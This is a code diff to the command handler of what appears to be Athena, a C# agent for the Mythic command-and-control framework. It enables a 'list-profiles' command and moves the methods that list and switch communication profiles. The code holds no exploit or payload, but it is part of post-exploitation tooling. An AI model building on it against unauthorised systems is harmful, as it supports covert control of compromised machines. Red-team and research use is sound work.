@@ -127,6 +127,8 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "1CDEDE1665F21542BDE8DD9F3C4E362E": //list-profiles
+                    this.responseResults.Add(await this.ListProfiles(job));
+                    this.activeJobs.Remove(task.id, out _);
                     //test
                     break;
                 case "EC4D1EB36B22D19728E9D1D23CA84D1C": //load
@@ -219,6 +221,39 @@ namespace Athena.Commands
             }
 #endif
         }
+
+        /// <summary>
+        /// EventHandler to update sleep and jitter
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void SwitchProfile(MythicJob job)
+        {
+            ProfileEventArgs switchArgs = new ProfileEventArgs(job);
+            SetProfile(this, switchArgs);
+        }
+
+        private async Task<ResponseResult> ListProfiles(MythicJob job)
+        {
+            StringBuilder sb = new StringBuilder();
+            var type = typeof(IProfile);
+            var types = AppDomain.CurrentDomain.GetAssemblies()
+                .SelectMany(s => s.GetTypes())
+                .Where(p => type.IsAssignableFrom(p) && !p.IsInterface);
+
+            foreach (var prof in types)
+            {
+                sb.AppendLine(prof.FullName);
+            }
+
+            return new ResponseResult()
+            {
+                task_id = job.task.id,
+                completed = "true",
+                user_output = sb.ToString()
+            };
+
+        }
+
         /// <summary>
         /// EventHandler to begin exit
         /// </summary>
@@ -280,37 +315,6 @@ namespace Athena.Commands
         public async Task StopJob(MythicTask task)
         {
             //todo
-        }
-
-        /// <summary>
-        /// EventHandler to update sleep and jitter
-        /// </summary>
-        /// <param name="job">MythicJob to pass with the event</param>
-        private void SwitchProfile(MythicJob job)
-        {
-            ProfileEventArgs switchArgs = new ProfileEventArgs(job);
-        }
-
-        private async Task<ResponseResult> ListProfiles(MythicJob job)
-        {
-            StringBuilder sb = new StringBuilder();
-            var type = typeof(IProfile);
-            var types = AppDomain.CurrentDomain.GetAssemblies()
-                .SelectMany(s => s.GetTypes())
-                .Where(p => type.IsAssignableFrom(p) && !p.IsInterface);
-
-            foreach(var prof in types)
-            {
-                sb.AppendLine(prof.Name);
-            }
-
-            return new ResponseResult()
-            {
-                task_id = job.task.id,
-                completed = "true",
-                user_output = sb.ToString()
-            };
-
         }
 
         /// <summary>
